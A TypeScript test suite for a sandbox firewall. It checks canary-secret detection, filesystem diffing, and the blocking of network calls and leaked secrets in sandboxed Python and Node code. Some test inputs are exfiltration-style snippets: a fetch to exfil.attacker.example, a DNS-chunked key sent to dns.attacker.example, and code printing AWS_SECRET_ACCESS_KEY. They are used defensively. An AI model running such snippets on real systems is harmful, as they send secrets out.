import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { newId, type RunRequest } from "@firewall/contract";
import { preset } from "@firewall/policy";
import { findCanaries } from "./canary.js";
import { diff, type FsSnapshot } from "./fsdiff.js";
import { WasmerRunner } from "./runner.js";

describe("canary", () => {
  const canaries = { KEY: "AKIAFAKE0000CANARY42/firewall" };
  it("finds raw and encoded values", () => {
    expect(findCanaries("x AKIAFAKE0000CANARY42/firewall y", canaries)).toEqual([{ name: "KEY", encoding: "raw" }]);
    expect(findCanaries(Buffer.from(canaries.KEY).toString("base64"), canaries)[0]?.encoding).toBe("base64");
    expect(findCanaries(encodeURIComponent(canaries.KEY), canaries)[0]?.encoding).toBe("urlencoded");
    expect(findCanaries("nothing here", canaries)).toEqual([]);
  });
  it("finds dns-sized chunks", () => {
    const b64 = Buffer.from(canaries.KEY).toString("base64url");
    const host = `${b64.slice(0, 20)}.dns.attacker.example`;
    expect(findCanaries(host, canaries, { minChunk: 12 }).length).toBe(1);
    expect(findCanaries(host, canaries).length).toBe(0);
  });
});

describe("fsdiff", () => {
  it("classifies create, modify and delete", () => {
    const before: FsSnapshot = new Map([
      ["/workspace/a.txt", { kind: "file", size: 1, hash: "x" }],
      ["/workspace/gone.txt", { kind: "file", size: 1, hash: "y" }],
    ]);
    const after: FsSnapshot = new Map([
      ["/workspace/a.txt", { kind: "file", size: 1, hash: "z" }],
      ["/workspace/out", { kind: "directory", size: 0 }],
      ["/workspace/out/new.txt", { kind: "file", size: 3, hash: "n" }],
    ]);
    const changes = diff(before, after, (p) => p.startsWith("/workspace/out/"));
    expect(changes).toEqual([
      { path: "/workspace/a.txt", op: "modify", bytes: 1, allowed: false },
      { path: "/workspace/out/new.txt", op: "create", bytes: 3, allowed: true },
      { path: "/workspace/gone.txt", op: "delete", allowed: false },
    ]);
  });
});

const online = process.env.FIREWALL_TEST_ONLINE === "1";

describe("WasmerRunner (real sandboxes)", () => {
  const runner = new WasmerRunner({ maxConcurrent: 2 });
  beforeAll(async () => {
    await runner.warm(["python"]);
  }, 180_000);
  afterAll(async () => {
    await runner.close();
  });

  const req = (code: string, over: Partial<RunRequest> = {}): RunRequest => ({
    id: newId("test"),
    language: "python",
    code,
    policy: preset("strict"),
    ...over,
  });

  it("runs clean code and reports timings", async () => {
    const t = await runner.run(req("print(sum(range(10)))"));
    expect(t.stdout.trim()).toBe("45");
    expect(t.exitCode).toBe(0);
    expect(t.verdict).toBe("clean");
    expect(t.violations).toEqual([]);
    expect(t.timings.sandboxCreateMs).toBeLessThan(2000);
  });

  it("blocks and records a network attempt under strict policy", async () => {
    const t = await runner.run(
      req("import urllib.request\ntry:\n  urllib.request.urlopen('http://exfil.attacker.example/x', timeout=5)\nexcept Exception as e:\n  print('failed', e)"),
    );
    expect(t.network.some((e) => e.host === "exfil.attacker.example" && !e.allowed)).toBe(true);
    expect(t.violations.map((v) => v.kind)).toContain("network.blocked");
    expect(t.verdict).toBe("blocked");
  });

  it("refuses raw IP connections not derived from an allowed resolve", async () => {
    const t = await runner.run(req("import socket\ns=socket.socket()\ns.settimeout(5)\ntry:\n  s.connect(('93.184.216.34',80)); print('connected')\nexcept Exception as e:\n  print('failed', e)"));
    expect(t.stdout).toContain("failed");
    expect(t.network.some((e) => e.kind === "connect" && e.host === "93.184.216.34" && !e.allowed)).toBe(true);
    expect(t.verdict).toBe("blocked");
  });

  it("flags writes outside writable paths and allows out/", async () => {
    const t = await runner.run(req("import os\nos.makedirs('out', exist_ok=True)\nopen('out/ok.txt','w').write('fine')\nopen('notes.txt','w').write('hi')\nprint('wrote')"));
    expect(t.fs).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ path: "/workspace/out/ok.txt", allowed: true }),
        expect.objectContaining({ path: "/workspace/notes.txt", allowed: false }),
      ]),
    );
    expect(t.violations.map((v) => v.kind)).toEqual(["fs.outside_writable"]);
    expect(t.verdict).toBe("suspicious");
  });

  it("detects a canary leaked through stdout", async () => {
    const t = await runner.run(req("import os\nprint('key is', os.environ['AWS_SECRET_ACCESS_KEY'])"));
    expect(t.violations.map((v) => v.kind)).toContain("canary.leaked");
    expect(t.verdict).toBe("blocked");
  });

  it("kills a cpu hog at the wall-clock limit", async () => {
    const p = preset("strict");
    p.limits.wallMs = 2000;
    const t = await runner.run(req("while True: pass", { policy: p }));
    expect(t.exitReason).toBe("timeout");
    expect(t.violations.map((v) => v.kind)).toContain("limit.wall");
  });

  it("truncates flooding output", async () => {
    const p = preset("strict");
    p.limits.maxOutputBytes = 4096;
    const t = await runner.run(req("print('x' * 100000)", { policy: p }));
    expect(t.outputTruncated).toBe(true);
    expect(t.violations.map((v) => v.kind)).toContain("limit.output");
  });

  it("runs interpreter args directly when code is empty", async () => {
    const t = await runner.run(req("", { args: ["-c", "print('direct')"] }));
    expect(t.stdout.trim()).toBe("direct");
  });

  it.skipIf(!online)("allows an allowlisted host end to end", async () => {
    const t = await runner.run(req("import urllib.request\nprint(urllib.request.urlopen('http://example.com', timeout=10).status)", { policy: preset("research") }));
    expect(t.stdout.trim()).toBe("200");
    expect(t.network.filter((e) => !e.allowed)).toEqual([]);
    expect(t.verdict).toBe("clean");
  });
});

describe("WasmerRunner Node guest host-fetch path", () => {
  const runner = new WasmerRunner({ maxConcurrent: 2 });
  afterAll(async () => {
    await runner.close();
  });
  const nodeReq = (code: string, policy = preset("strict")): RunRequest => ({ id: newId("test"), language: "node", code, policy });
  const FETCH = `fetch("http://example.com/").then(r => console.log("fetch status", r.status), e => console.log("fetch failed:", e.message)); setTimeout(() => {}, 1500);`;

  it("refuses Node fetch under strict and records the attempt", async () => {
    const t = await runner.run(nodeReq(FETCH));
    expect(t.stdout).toContain("firewall refused example.com");
    expect(t.network).toEqual([expect.objectContaining({ kind: "connect", host: "example.com", port: 80, allowed: false })]);
    expect(t.verdict).toBe("blocked");
  }, 120_000);

  it.skipIf(!online)("allows Node fetch to an allowlisted host", async () => {
    const t = await runner.run(nodeReq(FETCH, preset("research")));
    expect(t.stdout).toContain("fetch status 200");
    expect(t.network).toEqual([expect.objectContaining({ host: "example.com", allowed: true })]);
    expect(t.verdict).toBe("clean");
  }, 120_000);
});
